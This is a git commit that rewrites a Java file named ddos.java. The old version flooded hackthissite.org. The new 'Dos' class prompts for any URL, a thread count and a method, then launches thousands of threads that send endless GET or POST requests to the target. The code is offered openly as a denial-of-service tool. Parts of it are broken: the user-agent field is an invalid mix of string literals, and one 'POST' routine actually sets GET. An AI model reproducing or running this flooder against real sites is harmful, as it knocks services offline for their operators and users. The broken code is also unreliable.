41fd7fdbe97338f0b843b32f38c10a45cc30dfb6
dangquocvinh05 <108565328+dangquocvinh05@users.noreply.github.com>
2022-08-10 20:14:13 +0700

    Update ddos.java

--- ddos.java
+++ ddos.java
@@ -1,63 +1,212 @@
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.net.URLEncoder;
-import java.util.concurrent.atomic.AtomicBoolean;
+import java.io.*;
+import java.net.*;
+import java.util.Scanner;
+import java.util.ArrayList;
 
-/*
-Author :- N4VIYA98 
-*/
+import javax.net.ssl.HttpsURLConnection;
 
-public class DdosAttack {
 
-    public static void main(String[] args) throws Exception {
-        for (int i = 0; i < 2000; i++) {
-            DdosThread thread = new DdosThread();
-            thread.start();
+public class Dos implements Runnable {
+
+
+
+    private final String USER_AGENT =   "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
+		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
+		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
+		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
+		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
+		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
+		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
+		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
+		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
+		"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51";
+
+    private static int amount = 0;
+    private static String url = "";
+    int seq;
+    int type;
+
+    public Dos(int seq, int type) {
+        this.seq = seq;
+        this.type = type;
+    }
+
+    public void run() {
+        try {
+            while (true) {
+                switch (this.type) {
+                    case 1:
+                        postAttack(Dos.url);
+                        break;
+                    case 2:
+                        sslPostAttack(Dos.url);
+                        break;
+                    case 3:
+                        getAttack(Dos.url);
+                        break;
+                    case 4:
+                        sslGetAttack(Dos.url);
+                        break;
+
+                }
+            }
+        } catch (Exception e) {
+
         }
     }
 
-    public static class DdosThread extends Thread {
 
-        private AtomicBoolean running = new AtomicBoolean(true);
-        private final String request = "https://www.hackthissite.org";
-        private final URL url;
+    public static void main(String[] args) throws Exception {
+        String url = "";
+        int attakingAmoun = 0;
+        Dos dos = new Dos(0, 0);
+        Scanner in = new Scanner(System.in);
+        System.out.print("Enter Url: ");
+        url = in.nextLine();
+        System.out.println("\n");
+        System.out.println("Starting Attack to url: " + url);
 
-        String param = null;
+        String[] SUrl = url.split("://");
 
-        public DdosThread() throws Exception {
-            url = new URL(request);
-            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
+        System.out.println("Checking connection to Site");
+        if (SUrl[0] == "http" || SUrl[0].equals("http")) {
+            dos.checkConnection(url);
+        } else {
+            dos.sslCheckConnection(url);
         }
 
-        @Override
-        public void run() {
-            while (running.get()) {
-                try {
-                    attack();
-                } catch (Exception e) {
+        System.out.println("Setting DDoS By: Shadow Tak");
 
-                }
+        System.out.print("Thread: ");
+        String amount = in.nextLine();
 
+        if (amount == null || amount.equals(null) || amount.equals("")) {
+            Dos.amount = 2000;
+        } else {
+            Dos.amount = Integer.parseInt(amount);
+        }
+
+        System.out.print("method: ");
+        String option = in.nextLine();
+        int ioption = 1;
+        if (option == "get" || option == "GET") {
+            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
+                ioption = 3;
+            } else {
+                ioption = 4;
+            }
+        } else {
+            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
+                ioption = 1;
+            } else {
+                ioption = 2;
             }
         }
 
-        public void attack() throws Exception {
-            HttpURLConnection connection = (HttpURLConnection) url
-                    .openConnection();
-            connection.setDoOutput(true);
-            connection.setDoInput(true);
-            connection.setRequestMethod("GET");
-            connection.setRequestProperty("charset", "utf-8");
-            connection.setRequestProperty("Host", this.request);
-            connection
-                    .setRequestProperty("User-Agent",
-                            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
-            connection.setRequestProperty("Content-Type",
-                    "application/x-www-form-urlencoded");
-            connection.setRequestProperty("Content-Length", param);
-            System.out.println(this + "  " + connection.getResponseCode());
-            connection.getInputStream();
+        Thread.sleep(2000);
+
+
+        System.out.println("Starting Attack");
+        ArrayList<Thread> threads = new ArrayList<Thread>();
+        for (int i = 0; i < Dos.amount; i++) {
+            Thread t = new Thread(new Dos(i, ioption));
+            t.start();
+            threads.add(t);
         }
+
+        for (int i = 0; i < threads.size(); i++) {
+            Thread t = threads.get(i);
+            try {
+                t.join();
+            } catch (Exception e) {
+
+            }
+        }
+        System.out.println("Main Thread ended");
     }
 
+    private void checkConnection(String url) throws Exception {
+        System.out.println("Checking Connection");
+        URL obj = new URL(url);
+        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
+        con.setRequestMethod("GET");
+        con.setRequestProperty("User-Agent", USER_AGENT);
+
+        int responseCode = con.getResponseCode();
+        if (responseCode == 200) {
+            System.out.println("Connected to website");
+        }
+        Dos.url = url;
+    }
+
+    private void sslCheckConnection(String url) throws Exception {
+        System.out.println("Checking Connection (ssl)");
+        URL obj = new URL(url);
+        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
+        con.setRequestMethod("GET");
+        con.setRequestProperty("User-Agent", USER_AGENT);
+
+        int responseCode = con.getResponseCode();
+        if (responseCode == 200) {
+            System.out.println("Connected to website");
+        }
+        Dos.url = url;
+    }
+
+    private void postAttack(String url) throws Exception {
+        URL obj = new URL(url);
+        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
+        con.setRequestMethod("POST");
+        con.setRequestProperty("User-Agent", USER_AGENT);
+        con.setRequestProperty("Accept-Language", "en-US,en;");
+        String urlParameters = "out of memory";
+
+        con.setDoOutput(true);
+        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
+        wr.writeBytes(urlParameters);
+        wr.flush();
+        wr.close();
+        int responseCode = con.getResponseCode();
+        System.out.println("POST attack done!: " + responseCode + "Thread: " + this.seq);
+    }
+
+    private void getAttack(String url) throws Exception {
+        URL obj = new URL(url);
+        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
+        con.setRequestMethod("GET");
+        con.setRequestProperty("User-Agent", USER_AGENT);
+
+        int responseCode = con.getResponseCode();
+        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
+    }
+
+    private void sslPostAttack(String url) throws Exception {
+        URL obj = new URL(url);
+        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
+        con.setRequestMethod("GET");
+        con.setRequestProperty("User-Agent", USER_AGENT);
+        con.setRequestProperty("Accept-Language", "en-US,en;");
+        String urlParameters = "out of memory";
+
+        con.setDoOutput(true);
+        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
+        wr.writeBytes(urlParameters);
+        wr.flush();
+        wr.close();
+        int responseCode = con.getResponseCode();
+        System.out.println("GET attack done!:" + responseCode + "Thread: " + this.seq);
+    }
+
+    private void sslGetAttack(String url) throws Exception {
+        URL obj = new URL(url);
+        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
+        con.setRequestMethod("GET");
+        con.setRequestProperty("User-Agent", USER_AGENT);
+
+        int responseCode = con.getResponseCode();
+        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
+    }
 }
